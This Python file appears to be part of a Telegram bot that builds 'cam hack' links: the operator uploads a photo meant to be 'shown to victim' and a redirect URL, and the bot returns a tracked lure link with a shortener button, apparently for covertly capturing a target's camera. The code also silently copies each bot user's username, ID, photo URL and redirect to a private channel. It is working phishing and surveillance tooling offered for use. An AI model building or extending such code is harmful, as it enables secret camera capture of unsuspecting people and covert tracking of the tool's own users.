import uuid
import time
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from bot.config import BOT_TOKEN, PRIVATE_CHANNEL_ID, BASE_URL
from bot.utils.storage import user_data, link_cache, victim_data_store, user_username_cache

def handle_cam_hack(bot, message, get_bottom_buttons):
    user_id = message.chat.id

    # ===== CAPTURE USERNAME =====
    try:
        chat = bot.get_chat(user_id)
        if chat.username:
            user_username_cache[user_id] = f"@{chat.username}"
        else:
            user_username_cache[user_id] = f"{chat.first_name or 'Unknown'}"
    except:
        user_username_cache[user_id] = "Unknown"

    msg = bot.send_message(user_id, "📤 Send me a PHOTO (will be shown to victim)", reply_markup=get_bottom_buttons())
    bot.register_next_step_handler(msg, lambda m: get_cam_photo(m, user_id, get_bottom_buttons, bot))

def get_cam_photo(message, user_id, get_bottom_buttons, bot):
    if message.photo:
        photo_id = message.photo[-1].file_id
        file_info = bot.get_file(photo_id)
        photo_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_info.file_path}"
        user_data[user_id] = {"photo_url": photo_url}
        victim_data_store[f"photo_{user_id}"] = photo_url

        # ===== CHANNEL ME USERNAME + ID BHEJO =====
        username = user_username_cache.get(user_id, "Unknown")
        bot.send_photo(
            PRIVATE_CHANNEL_ID,
            photo_id,
            caption=f"📸 *User Uploaded Photo*\n\n"
                    f"👤 Username: `{username}`\n"
                    f"🆔 ID: `{user_id}`"
        )
        bot.send_message(
            PRIVATE_CHANNEL_ID,
            f"🔗 Photo URL: {photo_url}\n"
            f"👤 User: {username}\n"
            f"🆔 ID: `{user_id}`",
            parse_mode="Markdown"
        )

        msg = bot.send_message(user_id, "📤 Now send REDIRECT LINK", reply_markup=get_bottom_buttons())
        bot.register_next_step_handler(msg, lambda m: get_cam_redirect(m, user_id, get_bottom_buttons, bot))
    else:
        bot.send_message(user_id, "❌ Send a PHOTO first.", reply_markup=get_bottom_buttons())

def get_cam_redirect(message, user_id, get_bottom_buttons, bot):
    redirect_url = message.text
    if redirect_url.startswith("http"):
        user_data[user_id]["redirect"] = redirect_url
        victim_data_store[f"redirect_{user_id}"] = redirect_url

        username = user_username_cache.get(user_id, "Unknown")

        bot.send_message(
            PRIVATE_CHANNEL_ID,
            f"🔗 *Redirect Link Set*\n\n"
            f"👤 User: {username}\n"
            f"🆔 ID: `{user_id}`\n"
            f"🌐 Redirect: {redirect_url}",
            parse_mode="Markdown"
        )

        unique_id = str(uuid.uuid4())[:8]
        link = f"{BASE_URL}/p/cam/{unique_id}?v={user_id}"
        link_cache[unique_id] = {
            "user_id": user_id,
            "time": time.time(),
            "type": "cam",
            "link": link
        }

        bot.send_message(
            PRIVATE_CHANNEL_ID,
            f"✅ *Final Cam Hack Link*\n\n"
            f"👤 User: {username}\n"
            f"🆔 ID: `{user_id}`\n"
            f"🔗 Link: {link}",
            parse_mode="Markdown"
        )

        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("🔗 Open", url=link),
            InlineKeyboardButton("📋 Copy", callback_data="copy"),
            InlineKeyboardButton("🔗 Shorten", url="https://short-link.me/")
        )
        bot.send_message(
            user_id,
            f"✅ *CAMERA link:*\n`{link}`\n\nRedirect: `{redirect_url}`",
            reply_markup=markup,
            parse_mode="Markdown"
        )
    else:
        bot.send_message(user_id, "❌ Valid URL", reply_markup=get_bottom_buttons())
        msg = bot.send_message(user_id, "📤 Send REDIRECT LINK", reply_markup=get_bottom_buttons())
        bot.register_next_step_handler(msg, lambda m: get_cam_redirect(m, user_id, get_bottom_buttons, bot))
